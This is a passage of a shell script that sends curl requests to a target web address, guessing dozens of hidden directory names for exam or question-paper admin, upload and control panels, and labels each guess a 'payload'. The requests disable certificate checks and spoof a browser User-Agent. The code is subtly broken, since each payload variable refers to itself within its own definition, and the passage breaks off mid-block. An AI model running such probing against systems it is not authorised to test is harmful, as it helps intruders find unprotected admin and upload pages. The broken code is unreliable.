code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
